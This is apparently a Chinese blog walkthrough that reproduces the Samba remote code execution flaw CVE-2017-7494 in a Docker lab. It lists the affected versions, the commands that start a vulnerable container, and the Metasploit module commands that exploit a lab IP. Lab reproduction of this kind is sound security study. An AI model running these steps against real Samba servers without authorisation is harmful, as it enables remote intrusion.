---
title: Samba远程代码执行漏洞(CVE-2017-7494)
category: 
- 渗透测试
tags: 
- Docker
- 漏洞复现
---

### 漏洞概述

- [影响版本](https://www.samba.org/samba/security/CVE-2017-7494.html)
- 漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。

### 镜像信息

![image-20201201140024988](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201201140024988.png)

### 漏洞环境搭建

- 拉取镜像到本地

```bash
$ docker pull medicean/vulapps:s_samba_1
```

- 启动环境

```bash
$ docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1
```

<!-- more -->

### 漏洞利用

- 假定目标 IP 是： 192.168.184.131

### 利用过程

- 启动kali
- 使用docker搭建漏洞环境
- 启动msf开始利用

```bash
use exploit/linux/samba/is_known_pipename
set rhosts 192.168.184.131
show options
run
```

![image-20201201141134964](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201201141134964.png)

### 参考链接

[references](http://blogs.360.cn/blog/samba%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2017-7494%E5%88%86%E6%9E%90/)